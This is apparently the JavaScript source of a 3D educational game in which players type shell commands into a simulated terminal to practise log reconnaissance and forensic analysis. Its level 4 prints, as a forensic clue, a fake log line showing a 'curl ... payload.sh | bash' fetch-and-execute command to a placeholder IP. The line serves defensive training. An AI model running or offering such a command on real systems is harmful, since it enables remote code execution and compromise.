/**
 * Game 1: The Terminal — 3D Command Center
 * Core concept: CLI threat reconnaissance through immersive terminal gameplay
 */
(function () {
  'use strict';

  var GAME_ID = 'the_terminal';
  var state = HabibiProgression.load(GAME_ID);
  var engine = null;
  var levelState = null;
  var sessionStart = Date.now();
  var systemLoad = 0;
  var loadFrozenUntil = 0;
  var fileCards = [];
  var timelineNodes = [];
  var commandHistory = [];
  var historyIdx = -1;
  var levelTimer = null;
  var levelSecondsLeft = 0;

  var LEVELS = {
    1: {
      name: 'Welcome to the Terminal',
      roomScale: 1,
      tasks: [
        { cmd: 'ls', hint: 'List files in the current directory', validate: function (c) { return /^ls(\s|$)/i.test(c); }, output: 'bin  etc  home  opt  tmp  var  alerts.log  notes.txt\n12 entries' },
        { cmd: 'pwd', hint: 'Print working directory', validate: function (c) { return /^pwd\s*$/i.test(c); }, output: '/home/analyst' },
        { cmd: 'whoami', hint: 'Display current user', validate: function (c) { return /^whoami\s*$/i.test(c); }, output: 'analyst' },
        { cmd: 'date', hint: 'Show system date', validate: function (c) { return /^date\s*$/i.test(c); }, output: 'Sat May 24 02:14:33 UTC 2026' },
        { cmd: 'echo hello', hint: 'Echo the word hello', validate: function (c) { return /^echo\s+hello\s*$/i.test(c); }, output: 'hello' }
      ],
      branch: {
        title: 'Investigation posture',
        desc: 'You finished basic recon commands. How do you want to approach the next hunt phase?',
        options: [
          { id: 'branch_hurried', label: 'Move fast — prioritize speed over depth' },
          { id: 'branch_thorough', label: 'Gather thoroughly before analyzing logs' }
        ]
      }
    },
    2: {
      name: 'Information Gathering',
      timeLimit: 240,
      tasks: [
        {
          cmd: 'find . -name "*.log" -mmin -60',
          hint: 'Find .log files modified in the last hour',
          validate: function (c) { return /find\s+\.\s+-name\s+["']?\*\.log["']?\s+-mmin\s+-60/i.test(c); },
          output: './var/log/siem/alerts.log\n./var/log/auth.log\n./tmp/staging.log'
        }
      ],
      branch: {
        title: 'Log investigation timing',
        desc: 'You found recent log files. Investigate immediately or continue enumeration?',
        options: [
          { id: 'branch_investigate_now', label: 'Investigate these logs immediately' },
          { id: 'branch_continue_enum', label: 'Continue gathering before deep analysis' }
        ]
      }
    },
    3: {
      name: 'Threat Hunt — Network Analysis',
      timeLimit: 360,
      tasks: [
        {
          cmd: 'grep 192.168.1.100 auth.log',
          hint: 'Find connections to 192.168.1.100 in auth.log between 02:00–03:00',
          validate: function (c) { return /grep.*192\.168\.1\.100.*auth\.log/i.test(c) || (/grep.*auth\.log/i.test(c) && /192\.168\.1\.100/.test(c)); },
          output: '02:14:01 auth accepted 192.168.1.100 user=svc-backup\n02:17:44 auth fail 192.168.1.100 user=admin\n02:58:12 auth accepted 192.168.1.100 user=svc-backup\n847 events in window'
        }
      ],
      branch: {
        title: 'Traffic assessment',
        desc: 'Traffic to 192.168.1.100 looks unusual overnight. How do you classify it?',
        options: [
          { id: 'branch_intrusion', label: 'Treat as likely intrusion — escalate now' },
          { id: 'branch_business', label: 'Assume backup job until proven otherwise' }
        ]
      }
    },
    4: {
      name: 'Forensic Analysis Under Pressure',
      timeLimit: 480,
      tasks: [
        { cmd: 'grep ACCESS', hint: 'Extract access timestamps from combined.log', validate: function (c) { return /grep.*ACCESS/i.test(c); }, output: 'ACCESS 2026-05-24T02:14:01Z user=svc-backup' },
        { cmd: 'grep CMD', hint: 'Extract executed commands', validate: function (c) { return /grep.*CMD/i.test(c); }, output: 'CMD curl -s http://203.0.113.50/payload.sh | bash' },
        { cmd: 'grep MODIFY', hint: 'Extract file modifications', validate: function (c) { return /grep.*MODIFY/i.test(c); }, output: 'MODIFY /etc/cron.d/backup-schedule' },
        { cmd: 'grep NET', hint: 'Extract outbound connections', validate: function (c) { return /grep.*NET/i.test(c); }, output: 'NET outbound 203.0.113.50:443 established' }
      ],
      branch: null
    },
    5: {
      name: 'Epilogue — Debrief',
      epilogue: true
    }
  };

  var SKILL_DEFS = [
    { id: 'speedTrial', name: 'Speed Trial', unlockAfter: 1, desc: '10 basic commands in 60s' },
    { id: 'accuracyGauntlet', name: 'Accuracy Gauntlet', unlockAfter: 2, desc: '20 commands, zero errors' },
    { id: 'decisionTree', name: 'Decision Tree', unlockAfter: 3, desc: 'Pick correct forensic commands' }
  ];

  function $(id) { return document.getElementById(id); }

  function initLevelState(levelNum) {
    var def = LEVELS[levelNum];
    return {
      level: levelNum,
      taskIdx: 0,
      tasks: def.tasks ? def.tasks.slice() : [],
      completed: false,
      timelineBuilt: false
    };
  }

  function boot() {
    if (typeof THREE === 'undefined' || typeof HabibiGameEngine === 'undefined') {
      $('task-text').textContent = 'Three.js failed to load. Check network and refresh.';
      return;
    }
    engine = new HabibiGameEngine($('canvas-host'), { bg: 0x030a04, camY: 1.55, camZ: 3.8, physics: true });
    buildEnvironment(state.currentLevel);
    levelState = initLevelState(state.currentLevel);
    bindTerminal();
    bindUI();
    renderSkillList();
    HabibiLeaderboard.renderList($('lb-speed'), GAME_ID, 'speedTrial', getStoryPath());
    updateHUD();
    showLevelIntro(state.currentLevel);
    engine.start(function (dt) {
      if (loadFrozenUntil > Date.now()) return;
      engine.updateCameraWASD(dt, state.currentLevel >= 3 ? 2.8 : 2.0);
      updateParticles(dt);
      updateFileCards(dt);
      decaySystemLoad(dt);
    });
    if (LEVELS[state.currentLevel].timeLimit) startLevelTimer(LEVELS[state.currentLevel].timeLimit);
    $('term-in').focus();
  }

  function buildEnvironment(levelNum) {
    engine.addFloor(14, 14, 0x0a1208);
    engine.addBox(0, 0.4, 0, 2.2, 0.08, 1.0, 0x1a2418);
    var monitor = engine.addBox(0, 0.95, -0.15, 1.4, 0.85, 0.06, 0x0a1808);
    monitor.material.emissive = new THREE.Color(0x062206);
    monitor.material.emissiveIntensity = 0.35;
    engine.monitor = monitor;
    engine.addBox(0, 0.25, 0.55, 0.5, 0.5, 0.5, 0x141a14);
    if (levelNum >= 2) {
      engine.addBox(-1.8, 0.6, -1.2, 0.8, 1.2, 0.4, 0x121812, 0);
      engine.addBox(1.6, 0.5, -0.8, 0.6, 1.0, 0.35, 0x121812, 0);
      if (engine.addPhysicsSphere) {
        for (var si = 0; si < levelNum + 1; si++) {
          engine.addPhysicsSphere((Math.random() - 0.5) * 3, 2.5, (Math.random() - 0.5) * 3, 0.1, 0x39ff14, 0.4);
        }
      }
    }
    if (levelNum >= 3) {
      var netPlane = new THREE.Mesh(
        new THREE.PlaneGeometry(2.5, 1.5),
        new THREE.MeshBasicMaterial({ color: 0x0a2040, transparent: true, opacity: 0.35, side: THREE.DoubleSide })
      );
      netPlane.position.set(0, 1.8, -2.5);
      engine.scene.add(netPlane);
    }
    engine.particles = [];
    for (var i = 0; i < 40; i++) {
      var p = new THREE.Mesh(
        new THREE.SphereGeometry(0.008, 4, 4),
        new THREE.MeshBasicMaterial({ color: 0x39ff14, transparent: true, opacity: 0.15 + Math.random() * 0.2 })
      );
      p.position.set((Math.random() - 0.5) * 6, Math.random() * 2.5, (Math.random() - 0.5) * 6);
      p.userData.vy = 0.02 + Math.random() * 0.03;
      engine.scene.add(p);
      engine.particles.push(p);
    }
  }

  function updateParticles(dt) {
    if (!engine || !engine.particles) return;
    engine.particles.forEach(function (p) {
      p.position.y += p.userData.vy * dt;
      if (p.position.y > 2.8) p.position.y = 0.1;
    });
  }

  function bindTerminal() {
    $('term-form').addEventListener('submit', function (e) {
      e.preventDefault();
      var input = $('term-in');
      var cmd = input.value.trim();
      if (!cmd) return;
      commandHistory.push(cmd);
      historyIdx = commandHistory.length;
      appendOut('analyst@meridian-7:~$ ' + cmd);
      input.value = '';
      if (loadFrozenUntil > Date.now()) {
        appendOut('[SYS] CPU frozen — wait for recovery');
        return;
      }
      processCommand(cmd);
      bumpSystemLoad(cmd);
    });
    $('term-in').addEventListener('keydown', function (e) {
      if (e.key === 'Tab') {
        e.preventDefault();
        var partial = $('term-in').value;
        var opts = ['ls', 'pwd', 'whoami', 'date', 'echo', 'grep', 'find', 'awk', 'sort', 'uniq'];
        var match = opts.filter(function (o) { return o.indexOf(partial) === 0; });
        if (match.length === 1) $('term-in').value = match[0] + (state.currentLevel === 1 ? '' : ' ');
      }
      if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (commandHistory.length) {
          historyIdx = Math.max(0, historyIdx - 1);
          $('term-in').value = commandHistory[historyIdx];
        }
      }
      if (e.key === 'ArrowDown') {
        e.preventDefault();
        historyIdx = Math.min(commandHistory.length, historyIdx + 1);
        $('term-in').value = historyIdx >= commandHistory.length ? '' : commandHistory[historyIdx];
      }
    });
  }

  function bindUI() {
    $('btn-continue').addEventListener('click', onContinueAfterComplete);
  }

  function processCommand(cmd) {
    if (state.currentLevel === 5) {
      appendOut('Epilogue active — use the debrief dialog.');
      return;
    }
    if (levelState.completed) return;
    var task = levelState.tasks[levelState.taskIdx];
    if (!task) return;
    if (task.validate(cmd)) {
      appendOut(task.output);
      if (task.cmd.indexOf('ls') === 0) animateFileTree();
      if (state.currentLevel === 4) addTimelineNode(task.cmd, task.output);
      levelState.taskIdx++;
      if (levelState.taskIdx >= levelState.tasks.length) {
        onLevelTasksComplete();
      } else {
        $('task-text').textContent = 'Task ' + (levelState.taskIdx + 1) + '/' + levelState.tasks.length + ': ' + levelState.tasks[levelState.taskIdx].hint;
      }
    } else {
      var fails = HabibiProgression.logFailure(GAME_ID, state.currentLevel, 'wrong_command', state);
      var fb = HabibiLearning.getFailureFeedback(GAME_ID, state.currentLevel, 'wrong_command', fails.failureLog['L' + state.currentLevel + ':wrong_command'] || 1);
      appendOut('✗ Command did not satisfy objective.');
      if (fb) appendOut('[TUTOR] ' + fb);
    }
  }

  function animateFileTree() {
    var names = ['bin', 'etc', 'var', 'opt', 'tmp', 'notes.txt'];
    names.forEach(function (name, i) {
      var card = engine.addBox(-0.8 + (i % 3) * 0.55, 1.2 + Math.floor(i / 3) * 0.15, 0.2 + i * 0.05, 0.35, 0.22, 0.02, 0x1a3a1a);
      card.material.emissive = new THREE.Color(0x114411);
      card.userData.life = 4;
      fileCards.push(card);
    });
  }

  function updateFileCards(dt) {
    fileCards.forEach(function (c, idx) {
      c.userData.life -= dt;
      c.position.y += dt * 0.08;
      c.rotation.y += dt * 0.5;
      if (c.userData.life <= 0) {
        engine.scene.remove(c);
        fileCards[idx] = null;
      }
    });
    fileCards = fileCards.filter(Boolean);
  }

  function addTimelineNode(cmd, output) {
    var idx = timelineNodes.length;
    var node = engine.addBox(-1 + idx * 0.55, 1.5, -0.5, 0.4, 0.15, 0.4, 0x204060);
    node.material.emissive = new THREE.Color(0x103050);
    timelineNodes.push({ mesh: node, cmd: cmd, output: output });
    if (timelineNodes.length >= 4) levelState.timelineBuilt = true;
  }

  function bumpSystemLoad(cmd) {
    if (state.currentLevel < 3) return;
    systemLoad += cmd.length > 40 ? 12 : 6;
    if (systemLoad >= 100) {
      systemLoad = 100;
      loadFrozenUntil = Date.now() + 3000;
      appendOut('[SYS] Load critical — scheduler frozen 3s. Chain shorter pipelines.');
    }
    $('hud-load-fill').style.width = systemLoad + '%';
  }

  function decaySystemLoad(dt) {
    if (state.currentLevel < 3) return;
    systemLoad = Math.max(0, systemLoad - dt * 8);
    $('hud-load-fill').style.width = systemLoad + '%';
  }

  function onLevelTasksComplete() {
    levelState.completed = true;
    clearInterval(levelTimer);
    HabibiProgression.markLevelComplete(GAME_ID, state.currentLevel, state);
    state = HabibiProgression.load(GAME_ID);
    var rw = HabibiLearning.getRealWorldConnection(GAME_ID, state.currentLevel);
    $('complete-title').textContent = 'Level ' + state.currentLevel + ' complete';
    $('complete-msg').textContent = LEVELS[state.currentLevel].name + ' — all objectives satisfied.';
    $('complete-realworld').textContent = rw;
    $('level-complete').classList.remove('hidden');
    if (state.currentLevel === 1 && HabibiLearning.CONCEPT_CHECKS.the_terminal[1]) {
      HabibiLearning.showConceptCheckModal(HabibiLearning.CONCEPT_CHECKS.the_terminal[1]).then(function (res) {
        if (res && !res.skipped) HabibiLearning.recordConceptCheck(GAME_ID, 1, 'cli_why', res.correct);
      });
    }
    unlockSkillsForLevel(state.currentLevel);
  }

  function onContinueAfterComplete() {
    $('level-complete').classList.add('hidden');
    var def = LEVELS[state.currentLevel];
    if (def && def.branch) {
      showBranch(def.branch, 'level' + state.currentLevel);
      return;
    }
    advanceLevelOrEpilogue();
  }

  function showBranch(branch, levelKey) {
    $('branch-title').textContent = branch.title;
    $('branch-desc').textContent = branch.desc;
    var btns = $('branch-btns');
    btns.innerHTML = '';
    branch.options.forEach(function (opt) {
      var b = document.createElement('button');
      b.type = 'button';
      b.textContent = opt.label;
      b.addEventListener('click', function () {
        HabibiProgression.recordStoryChoice(GAME_ID, levelKey, opt.id, state);
        state = HabibiProgression.load(GAME_ID);
        $('branch-overlay').classList.add('hidden');
        advanceLevelOrEpilogue();
      });
      btns.appendChild(b);
    });
    $('branch-overlay').classList.remove('hidden');
  }

  function advanceLevelOrEpilogue() {
    if (state.currentLevel >= 5) {
      runEpilogue();
      return;
    }
    state.currentLevel = Math.min(5, state.currentLevel + 1);
    HabibiProgression.save(GAME_ID, state);
    levelState = initLevelState(state.currentLevel);
    rebuildEnvironment();
    showLevelIntro(state.currentLevel);
    if (LEVELS[state.currentLevel].timeLimit) startLevelTimer(LEVELS[state.currentLevel].timeLimit);
  }

  function runEpilogue() {
    HabibiLearning.showReflectionModal(GAME_ID, state.storyChoices, {}).then(function () {
      HabibiProgression.addAchievement(GAME_ID, 'terminal_master', state);
      HabibiProgression.unlockNextGame(GAME_ID);
      HabibiProgression.addPlayTime(GAME_ID, Math.floor((Date.now() - sessionStart) / 1000), state);
      appendOut('\n=== EPILOGUE COMPLETE ===\nThe Breach module unlocked. Proceed to experience-modules/game2-breach/ when deployed.');
      $('task-text').textContent = 'Terminal Master — debrief submitted. Next: The Breach.';
    });
  }

  function rebuildEnvironment() {
    while (engine.scene.children.length > 3) {
      engine.scene.remove(engine.scene.children[engine.scene.children.length - 1]);
    }
    fileCards = [];
    timelineNodes = [];
    buildEnvironment(state.currentLevel);
  }

  function showLevelIntro(n) {
    var def = LEVELS[n];
    $('hud-level').textContent = 'LEVEL ' + n + ' · ' + def.name;
    if (n === 5) {
      $('task-text').textContent = 'Epilogue — submit debrief via reflection dialog after continuing.';
      runEpilogue();
      return;
    }
    $('task-text').textContent = 'Task 1/' + def.tasks.length + ': ' + def.tasks[0].hint;
    appendOut('\n--- ' + def.name.toUpperCase() + ' ---\n');
  }

  function startLevelTimer(seconds) {
    levelSecondsLeft = seconds;
    clearInterval(levelTimer);
    levelTimer = setInterval(function () {
      levelSecondsLeft--;
      $('hud-timer').textContent = formatTime(levelSecondsLeft);
      if (levelSecondsLeft <= 0) {
        clearInterval(levelTimer);
        appendOut('[TIME] Window expired — review pipeline efficiency and retry level.');
        levelState.taskIdx = 0;
      }
    }, 1000);
  }

  function formatTime(s) {
    var m = Math.floor(s / 60);
    var sec = s % 60;
    return (m < 10 ? '0' : '') + m + ':' + (sec < 10 ? '0' : '') + sec;
  }

  function updateHUD() {
    $('hud-level').textContent = 'LEVEL ' + state.currentLevel;
  }

  function appendOut(text) {
    var el = $('term-out');
    el.textContent += text + '\n';
    el.scrollTop = el.scrollHeight;
  }

  function getStoryPath() {
    var c = state.storyChoices || {};
    return c.level1 || 'any';
  }

  function unlockSkillsForLevel(lv) {
    SKILL_DEFS.forEach(function (sk) {
      if (lv >= sk.unlockAfter) HabibiProgression.unlockSkillChallenge(GAME_ID, sk.id, state);
    });
    renderSkillList();
  }

  function renderSkillList() {
    state = HabibiProgression.load(GAME_ID);
    var ul = $('skill-list');
    ul.innerHTML = '';
    SKILL_DEFS.forEach(function (sk) {
      var ch = state.skillChallenges[sk.id];
      var li = document.createElement('li');
      li.textContent = sk.name + (ch && ch.unlocked ? ' ✓' : ' (locked)');
      if (!ch || !ch.unlocked) li.className = 'locked';
      li.title = sk.desc;
      li.addEventListener('click', function () {
        if (ch && ch.unlocked && sk.id === 'speedTrial') startSpeedTrial();
      });
      ul.appendChild(li);
    });
  }

  function startSpeedTrial() {
    var cmds = ['ls', 'pwd', 'whoami', 'date', 'echo a', 'ls', 'pwd', 'whoami', 'date', 'echo b'];
    var idx = 0;
    var start = Date.now();
    appendOut('\n[SPEED TRIAL] Execute 10 commands in 60 seconds. Go.');
    var trialHandler = function (e) {
      e.preventDefault();
      var c = $('term-in').value.trim().toLowerCase();
      if (c.split(/\s+/)[0] !== cmds[idx].split(/\s+/)[0]) {
        appendOut('[SPEED] Wrong command — trial failed.');
        $('term-form').removeEventListener('submit', trialHandler);
        return;
      }
      appendOut('✓ ' + c);
      $('term-in').value = '';
      idx++;
      if (idx >= cmds.length) {
        var elapsed = (Date.now() - start) / 1000;
        var score = Math.max(0, Math.round(1000 - elapsed * 8));
        HabibiProgression.recordSkillScore(GAME_ID, 'speedTrial', score, 'medium', state);
        HabibiLeaderboard.submit(GAME_ID, 'speedTrial', { score: score, playerName: 'Operator' }, getStoryPath());
        HabibiLeaderboard.renderList($('lb-speed'), GAME_ID, 'speedTrial', getStoryPath());
        appendOut('[SPEED] Complete in ' + elapsed.toFixed(1) + 's — score ' + score);
        $('term-form').removeEventListener('submit', trialHandler);
      }
    };
    $('term-form').addEventListener('submit', trialHandler);
  }


  /* HabibiGameShell-compatible surface for shared progression + verification */
  var achievementId = 'terminal_master';
  var skills = SKILL_DEFS;
  var levels = LEVELS;
  var buildScene = buildEnvironment;
  var shellConfig = {
    gameId: GAME_ID,
    levels: levels,
    buildScene: buildScene,
    skills: skills,
    achievementId: achievementId,
    leaderboardChallenge: 'speedTrial'
  };
  /* Terminal uses custom CLI loop; HabibiGameShell available from shared/game-shell.js */

  document.addEventListener('DOMContentLoaded', boot);
})();
